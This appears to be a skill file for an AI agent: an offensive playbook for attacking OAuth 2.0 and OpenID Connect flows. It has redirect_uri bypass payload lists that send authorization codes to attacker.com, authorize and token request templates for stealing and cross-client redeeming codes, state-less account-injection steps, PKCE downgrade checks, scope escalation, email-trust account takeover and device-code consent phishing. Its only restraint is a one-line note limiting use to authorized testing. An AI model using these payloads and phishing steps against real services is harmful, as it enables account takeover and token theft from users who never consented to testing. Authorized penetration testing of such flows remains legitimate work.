---
name: attacking-oauth-oidc
description: Attack OAuth 2.0 and OpenID Connect flows — enumerate endpoints from the OIDC discovery document, break redirect_uri validation with path traversal, open-redirect chaining, subdomain and regex weakness, and %2F/@ parser tricks, exploit missing state (callback CSRF) and absent or downgraded PKCE, steal codes and tokens via open redirectors and referer leakage, replay and inject authorization codes across clients, escalate scope and bypass consent, confuse access_token with id_token, and take over accounts through "Sign in with X" email trust and device-code consent phishing. Use when you see /authorize, /oauth/token, response_type, redirect_uri, client_id, code= or state= parameters, a "Sign in with Google/Microsoft/GitHub" button, or an OIDC discovery document at /.well-known/openid-configuration.
verified: 2026-07-26
---

# Attacking OAuth and OIDC

OAuth is a delegation protocol whose security lives entirely in parameters the
browser forwards — `redirect_uri`, `state`, and `scope` — so most breaks are the
authorization server or the client trusting one of those a little too much. The
token is the prize; the flow is the attack surface. Follow the redirect that
carries the code, and you follow the credential.

Only against systems you are authorized to test.

## When to Use

- A login page offers "Sign in with Google / Microsoft / GitHub / Apple" or any
  federated identity button
- You see `/authorize`, `/oauth/token`, `/oauth2/authorize`, or a callback URL
  carrying `code=`, `state=`, or `#access_token=`
- Requests contain `response_type`, `redirect_uri`, `client_id`, `scope`, or
  `nonce`
- An OIDC discovery document is served at `/.well-known/openid-configuration`
- The app exchanges an authorization code server-side for tokens, or accepts an
  `id_token` to establish a session
- A first-party SPA or mobile app runs the authorization-code-with-PKCE flow

## When NOT to Use

- **Forging, cracking, or tampering with the issued token itself** (alg confusion,
  `kid` injection, weak HMAC secret, `none`) — use `attacking-jwt`
- **General web application testing** unrelated to the auth flow — use
  `testing-web-applications`
- **The resource API after you already hold a valid access token** — use
  `testing-apis`
- **Entra/Azure AD tenant consent, app registration abuse, and multi-tenant app
  attacks specifically** — use `attacking-entra-id`
- **The human side — running consent-phishing or illicit-grant campaigns at
  scale against real users** — use `performing-social-engineering`

## Enumerate the Server: Discovery Document First

The OIDC discovery document hands you the entire attack map — every endpoint, the
supported flows, and the key set.

```bash
curl -s https://target/.well-known/openid-configuration | jq .
# Also try, per-tenant / per-realm:
#   https://target/.well-known/oauth-authorization-server
#   https://login.target/<tenant>/v2.0/.well-known/openid-configuration
#   https://target/auth/realms/<realm>/.well-known/openid-configuration   (Keycloak)
```

Read these fields specifically:

- `authorization_endpoint`, `token_endpoint`, `userinfo_endpoint` — the flow
- `jwks_uri` — the keys that validate `id_token`s (feeds `attacking-jwt`)
- `response_types_supported` — is `token` or `id_token token` (implicit)
  allowed? Is `code` the only option, or can you downgrade?
- `grant_types_supported` — is `implicit`, `password`, or
  `urn:ietf:params:oauth:grant-type:device_code` present?
- `code_challenge_methods_supported` — if absent, PKCE may not be enforced
- `scopes_supported`, `claims_supported` — the escalation menu

Pull the client bundle too: SPA JavaScript almost always inlines the
`client_id`, the configured `redirect_uri`, and the scope list.

## redirect_uri Validation: The Core Break

Everything hinges on where the authorization server is willing to send the code.
If you can make it send the code to a host you control, the flow is over. Work
through the validation weaknesses — a permissive registration or a prefix/substring
match instead of an exact match is the standard finding.

```
Registered: https://app.example.com/callback

Path traversal / appended path (prefix match, not exact)
  https://app.example.com/callback/../../attacker
  https://app.example.com/callback/anything          (allowed if it startswith-checks)
  https://app.example.com/callback.attacker.com/

Subdomain / domain-suffix weakness (regex or "endswith" match)
  https://attacker.app.example.com/callback
  https://app.example.com.attacker.com/callback
  https://appXexample.com/callback                    (unescaped . in regex)

Parser confusion — validator and browser disagree on the host
  https://attacker.com\@app.example.com/callback
  https://app.example.com@attacker.com/callback
  https://attacker.com%2F@app.example.com/
  https://attacker.com#@app.example.com/
  https://attacker.com%23.app.example.com/

Scheme / userinfo / whitespace
  http://app.example.com/callback                     (downgrade to plaintext)
  https://app.example.com%00.attacker.com/callback
  ///attacker.com/callback   //attacker.com/callback

localhost is frequently allow-listed with no port check
  http://localhost:1337/callback   http://127.0.0.1/callback
  http://localhost.attacker.com/callback
```

An authorize request pointing the code at your host:

```
GET /authorize?response_type=code
    &client_id=REAL_CLIENT_ID
    &redirect_uri=https://attacker.com/callback
    &scope=openid%20email%20profile
    &state=xyz HTTP/1.1
Host: login.target
```

If that returns a code to `attacker.com`, you exchange it (or the victim's
browser delivers theirs). Also test **each place `redirect_uri` is read** — the
authorize request, the token exchange, and any stored per-client default — because
some servers validate strictly at `/authorize` and loosely at `/token`, or vice
versa.

## Open Redirector as Exfil Channel

When `redirect_uri` must stay on the real domain, an open redirect *on that
domain* becomes the exfiltration path: the server sends the code to the
allow-listed host, which 302s it — and the `code` in the query string, or the
whole fragment — onward to you.

```
redirect_uri=https://app.example.com/redirect?next=https://attacker.com/
# code lands on app.example.com, its open redirect forwards it (and often the
# ?code=... query, via Referer or an explicit passthrough) to attacker.com
```

Chase any `next=`, `returnUrl=`, `RelayState=`, or `continue=` parameter on the
allow-listed origin. This is the reason an "exact redirect_uri match" that ends
on your own domain is still not safe.

## state: CSRF on the Callback

`state` is OAuth's CSRF token. If it is absent, static, predictable, or not
verified on return, an attacker stitches **their** authorization code onto the
**victim's** session — the login-CSRF / account-injection attack.

```
1. Attacker starts the flow, captures their own code but does NOT complete it.
2. Attacker delivers the callback to the victim:
   https://app.example.com/callback?code=ATTACKER_CODE   (no/ignored state)
3. Victim's browser completes it; victim's account is now linked to the
   attacker's identity provider account -> attacker logs in as the victim.
```

Test: remove `state` entirely, replay a `state` from a previous flow, and change
one character of the returned `state`. If the callback still completes, it is not
being verified. `nonce` gets the same treatment in OIDC — its job is replay
protection on the `id_token`.

## PKCE: Absence and Downgrade

PKCE binds the code to the client that requested it, defeating code
interception. Public clients (SPA, mobile) that skip it are exposed to any
attacker who grabs the code from a redirect, referer, or intercepting app.

```
# Authorize with a challenge:
GET /authorize?...&code_challenge=BASE64URL(SHA256(verifier))&code_challenge_method=S256

Checks:
- Omit code_challenge entirely -> does /token still return a token? (not enforced)
- Send code_challenge_method=plain with challenge == verifier (downgrade)
- Exchange the code with the WRONG code_verifier -> is it accepted? (not verified)
- Reuse the same verifier across two flows
```

If a code obtained under one flow can be redeemed without the matching verifier,
PKCE is decorative.

## Implicit Flow: Token Leakage

`response_type=token` / `id_token token` returns the token in the URL
**fragment**, which leaks through browser history, `Referer` headers on
subresource loads, and any JavaScript on the callback page.

```
GET /authorize?response_type=token&client_id=...&redirect_uri=https://app.example.com/cb
# -> 302 to https://app.example.com/cb#access_token=ya29...&token_type=Bearer
```

Force implicit even where code flow is expected (`response_type=token`), and pair
it with a redirect_uri or open-redirect weakness — the fragment rides along and
the token exfiltrates. Prefer reporting a downgrade-to-implicit as high severity:
it turns a fragment into a bearer credential in the URL bar.

## Code Injection, Replay, and Cross-Client Substitution

The authorization code is single-use and client-bound in a correct
implementation. Test all three properties.

- **Replay** — redeem the same `code` twice at `/token`. The second attempt must
  fail; a token on the second try means codes are not invalidated.
- **Injection** — inject a code obtained in your own session into the victim's
  callback (the `state`-less attack above), or inject the victim's leaked code
  into your session to log in as them.
- **Cross-client substitution** — obtain a code issued for `client_id=A` and
  redeem it at `/token` with `client_id=B` (both apps on the same authorization
  server). If the server does not bind the code to the issuing client, a code
  minted for a low-value app buys tokens for a high-value one.

```
POST /oauth/token HTTP/1.1
Host: login.target
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=VICTIM_OR_OTHER_CLIENT_CODE
&redirect_uri=https://app.example.com/callback
&client_id=DIFFERENT_CLIENT_ID&client_secret=...
```

## Scope Escalation and Consent Bypass

Add scopes to the authorize request and see whether the server grants them
without a fresh consent prompt — especially on **re-authorization**, where many
servers skip consent for an already-authorized client and silently attach the
new scopes.

```
# Request more than the app normally asks for:
scope=openid email profile offline_access admin read:all
```

Check: does `offline_access` (a long-lived refresh token) get granted silently?
Are scopes the client never requested honored if you inject them? Does the
returned token's actual scope exceed what was consented? Downgrade attacks matter
too — a first authorization with narrow scope, then a silent re-auth widening it.

## response_mode / response_type Confusion

Mixing response parameters can move a token to a place validation does not cover
or downgrade the flow.

```
response_mode=form_post   -> token delivered in a POST body (bypasses fragment
                             handling and some referer protections)
response_mode=web_message -> token posted via postMessage; test the target-origin
                             check for a wildcard or missing origin validation
response_type=code%20token / code%20id_token  -> hybrid flow; a code AND a
                             front-channel token, doubling the leak surface
```

## access_token vs id_token Confusion

The `access_token` is for calling the resource API; the `id_token` is proof of
authentication for the client. Backends routinely confuse them.

- A resource server that accepts an **`id_token`** as a bearer token (because
  both are JWTs) trusts a token the client should never present to it.
- A client that authenticates a session from an **`access_token`** — an opaque or
  loosely-validated string — instead of a properly validated `id_token` can be
  fed a token minted for a different audience.
- The token endpoint returns both; try each at every consumer and watch which are
  accepted where they should not be.

## id_token Validation Flaws

The client must validate the `id_token` signature against `jwks_uri` **and** the
claims. Missing claim checks are the account-takeover path.

- **`iss`** not checked — a token from a different (attacker-controlled) issuer is
  accepted.
- **`aud`** not checked — a token minted for *another client* on the same IdP
  (Google, Microsoft) is replayed here. This is the classic multi-tenant/social
  IdP takeover.
- **`azp`** (authorized party) ignored on multi-audience tokens.
- **`exp` / `nonce`** not enforced — replay of an old or captured token.

The signature-side attacks — `alg:none`, `alg` HS256/RS256 confusion, `kid`
injection, `jku`/`x5u` pointing at attacker keys — are in **`attacking-jwt`**.
Fetch `jwks_uri` from discovery and hand it off there.

## "Sign in with X" Account Takeover via Email Trust

The highest-yield federation bug: a client that links or creates accounts by the
**email** claim, trusting it as a verified unique key.

- Provider returns `email` without `email_verified`, or the client ignores
  `email_verified` — sign up at an IdP with the victim's email (unverified) and
  the client links you to their account.
- The client matches an existing local account by email and federates it — pre-hijack
  or takeover by registering the same email at a permissive provider.
- Multiple IdP buttons ("Google" and "GitHub") both keyed on email — log in via
  the provider where you can control an unverified email matching the victim.

Always inspect the `userinfo` / `id_token` claims actually returned and whether
`email_verified` is present and enforced before any account link.

## Device Code Flow and Consent Phishing (Illicit Grant)

The device authorization grant (`urn:ietf:params:oauth:grant-type:device_code`)
and the plain consent screen are the phishing surface: the attacker starts a
flow, gets a `user_code` / verification URL, and induces the victim to approve
it — yielding tokens to the attacker with no fake login page.

```
POST /oauth/device/code   client_id=REAL_CLIENT_ID&scope=openid%20offline_access
# -> device_code, user_code, verification_uri
# Victim visits the REAL verification_uri, enters the code, approves ->
POST /oauth/token   grant_type=...device_code&device_code=...&client_id=...
# attacker polls and receives access + refresh tokens
```

The victim sees the genuine provider consent page — that is what makes it
effective. Running this against real users at scale is a
`performing-social-engineering` engagement; for Entra-specific illicit consent
grants (malicious multi-tenant apps), use `attacking-entra-id`.

## Rationalizations to Reject

- *"redirect_uri is validated against an allow-list."* Exact match or prefix?
  Test traversal, subdomain suffix, `@`/`%2F`/`#` parser tricks, and an open
  redirector *on* the allow-listed host.
- *"We use the authorization code flow, not implicit — it's safe."* Codes leak,
  replay, and cross clients. And check whether `response_type=token` still works.
- *"state is optional; the SDK handles CSRF."* Remove it and see. A callback that
  completes without a verified `state` is account-injectable.
- *"PKCE is configured."* Configured is not enforced. Omit the challenge, send a
  wrong verifier, downgrade to `plain`.
- *"It's a JWT from Google, so it's trusted."* Trusted for which `aud`? A token
  minted for another client is a takeover if you don't check the audience.
- *"We match users by email — email is unique."* Only if `email_verified` is
  present and enforced. Unverified email is attacker-chosen.
- *"The consent screen is the real provider's, so it's legitimate."* Device-code
  and illicit-grant phishing rely on exactly that genuine screen.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Credential Access** (TA0006)

- [T1528](https://attack.mitre.org/techniques/T1528/) Steal Application Access Token — see also `testing-apis`, `exploiting-cloud-platforms`, `attacking-entra-id`
- [T1606](https://attack.mitre.org/techniques/T1606/) Forge Web Credentials — see also `attacking-jwt`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `attacking-jwt` — forging, cracking, and validation-bypassing the `id_token` /
  `access_token` once you have it (alg confusion, `kid`, `jku`, weak secret)
- `testing-web-applications` — the app surrounding the login flow
- `testing-apis` — exercising the resource server once you hold a token
- `attacking-entra-id` — Entra/Azure tenant consent, app registration, and
  multi-tenant illicit-grant abuse
- `reporting-security-findings` — severity for redirect_uri, state, and
  account-takeover findings
- Burp Suite (Repeater for authorize/token requests, browser proxy for the full
  redirect chain); the OAuth-focused Burp extensions — EsPReSSO and the JWT
  editors for decoding front-channel tokens; mitmproxy for capturing the fragment
  and cross-origin `postMessage` traffic that Burp's HTTP history misses
